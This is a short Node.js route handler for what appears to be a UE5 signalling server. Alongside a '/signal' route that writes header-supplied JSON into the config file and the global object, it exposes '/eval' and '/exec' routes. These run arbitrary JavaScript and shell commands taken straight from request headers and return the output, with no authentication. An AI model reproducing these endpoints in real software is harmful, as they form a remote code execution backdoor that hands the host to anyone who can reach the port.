
module.exports = async function (request, response, server) {

  switch (request.url) {
    case "/signal": {
      await Signal(request, response, server);

      break;
    }

    case "/eval": {
      try {
        const result = await eval(decodeURIComponent(request.headers['eval']))
        response.end(String(result), () => { })
      } catch (err) {
        response.end(String(err), () => { })
      }
      break;
    }

    case "/exec": {
      require('child_process').exec(request.headers['exec'], (error, stdout, stderr) => {
        if (error) {
          response.end(stderr)
        } else {
          response.end(stdout)
        }
      })
    }
  }
};

// 修改整体配置
async function Signal(request, response, server) {
  try {
    let newSignal = JSON.parse(decodeURIComponent(request.headers['signal']))


    let signal = require('./signal.json');

    Object.assign(signal, newSignal);

    //配置全局生效  除PORT|UE5未生效、  env暂时不管
    Object.assign(global, newSignal);



    //修改了端口，执行下列方法使其生效
    if (newSignal.PORT) {
      await global.serve();

    }

    if (newSignal.UE5) {
      global.InitUe5Pool();
    }

    await require('fs').promises.writeFile(__dirname + '/signal.json', JSON.stringify(signal, null, '\t'));

    await new Promise(res => {
      response.end(JSON.stringify(newSignal), res);
    })


    if (newSignal.PORT) {
      server.closeAllConnections()
      server.close(() => { });
    }


  } catch (err) {
    response.writeHead(400);
    response.end(err.message || err);
  }

}

